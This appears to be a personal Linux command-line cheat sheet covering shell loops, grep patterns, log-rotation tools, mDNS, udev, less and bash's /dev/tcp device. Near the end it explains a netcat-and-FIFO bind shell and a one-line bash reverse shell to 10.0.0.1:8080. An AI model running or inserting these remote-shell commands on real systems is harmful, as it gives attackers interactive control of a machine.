while ...; do command &; done
#this works
while ...; do command & done
#another solution
while ...; do coproc command ; done

coproc: a shell built-in
Create a coprocess, Execute COMMAND asynchronously

#delete last character from each line
cat file | rev | colrm 1 1 | rev

PPID shell variable

echo $0 # from cmdline
output: bash

sudo -E #preserve environment variables
sudo -E does not work if /etc/sudoers has secure_path set
workaround: sudo env "PATH=$PATH" <command...>

lspci | egrep -i 'wifi|wlan|wireless'
lspci -s [[[[<domain>]:]<bus>]:][<slot>][.[<func>]]
lspci -vv -s 00:19.0

#match any of multiple patterns:
$ grep "PATTERN1\|PATTERN2" FILE
$ grep -E "PATTERN1|PATTERN2" FILE
$ grep -e PATTERN1 -e PATTERN2 FILE
$ egrep "PATTERN1|PATTERN2" FILE
$ awk '/PATTERN1|PATTERN2/' FILE
$ sed -n -e '/PATTERN1/p' -e '/PATTERN2/p' FILE

log rotation:
#1. logrotate (use copytruncate option with stdout), need a cron job
    there is a window for data loss
#2. ./start.sh | rotatelogs -n 3 log/mylog.log 1M (from apache2-utils package)
   shortcoming: the current log is then mylog.log.1, not mylog.log
   also: ./start.sh | /home/myprog/myproglog.%Y-%m-%d-%H_%M_%S 2M
#3. https://superuser.com/questions/291368/log-rotation-of-stdout/291397
    https://askubuntu.com/questions/623038/rotate-nohup-output
#4. multilog : ./start.sh | multilog s1048576 n2 ./log
    s1048576: rotate the log file when it grows to 1MiB
    n2 : 2 rotated files
    shortcoming: the current file is called current (cannot change)
    rotated file is called @<tai64n timestamp>.s
    old log file is automatically removed at restart
    not a good choise
#5. tinylog:
    ./start.sh | ~/workspace/perp-2.07/perp/tinylog -k 5 -s 100000 log &>/dev/null
    current file is called current
    old logs: _20171215T235831.267856.s, _20171215T235836.718277.s, etc
    s suffix: safely written to disk
    _20171216T000053.423569.u : u means not safely written, this happens
    when we kill the process that pipes to tinylog. Upon restart, tinylog
    immediately rotate current and use the u suffix
    verdict: seems like a good choice

<program> 1</dev/null # runs program with a read-only stdout

mDNS: multicast DNS with service discovery, zeroconf
avahi:open-source implementation of zeroconf
avahi-browse -av
avahi-browse -atr
avahi-resolve -4 -n name.local

# test to see if any data on stdin
read -t 0
if [ $? -ne 0 ]; then
    # no data on stdin
    echo "Usage: $0 < filename"
else
    echo "Got data"
fi

VGA: 640x480
SVGA: 800x600
XGA: 1024x768

fbset: show/modify frame buffer device settings.

env -i: run program in an empty environment

Udev is the device manager that creates/removes device nodes in the /dev directory dynamically. It
is the successor of devfs and hotplug.
udev replaces the functionality of both hotplug and hwdetect.

#apply ed script: use diff -e old new
(cat diff.txt && echo w) | ed - <oldfile>

/etc/networks: link-local stuff

less: while paging, -i triggers smart-casing
smart-casing: ignore case when the pattern does not contain uppercase
===
less +F blah : follow, like tail -f, C-c to leave follow mode
less: while paging: F triggers follow mode, C-c to leave follow mode

column -t: create a table

web shell:
# on server side:
$ mkfifo /tmp/f
$ cat /tmp/f | /bin/sh -i 2>&1 | nc -nvv -l 1234 > /tmp/f
explanation:
when netcat receives input from the client connection, it will redirect it to FIFO.
example: client connection sends "ls", "ls" will be redirected to FIFO.
"ls" will come out the other end and be piped to /bin/sh. /bin/sh will execute
"ls and the output of "ls" will be piped to the same netcat process.
Any input to the server netcat process will be sent to the client connection.

mtr: my traceroute

sensible-editor, sensible-pager, sensible-browser
select-editor -> ~/.selected_editor
choices:
  1. /bin/ed
  2. /bin/nano        <---- easiest
  3. /usr/bin/emacs24
  4. /usr/bin/vim.basic
  5. /usr/bin/vim.tiny

reverse shell:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

The command bash -i >& invokes bash with an “interactive” option. Then /dev/tcp/10.0.0.1/8080
redirects that session to a tcp socket via device file.  Finally 0>&1 Takes standard output, and
connects it to standard input.

bash's built-in /dev/tcp device file

get time:
$ cat </dev/tcp/time.nist.gov/13
58341 18-08-11 17:55:07 50 0 0   0.0 UTC(NIST) *
$ curl time.nist.gov:13
58341 18-08-11 17:55:20 50 0 0 385.1 UTC(NIST) *

# causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket.
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
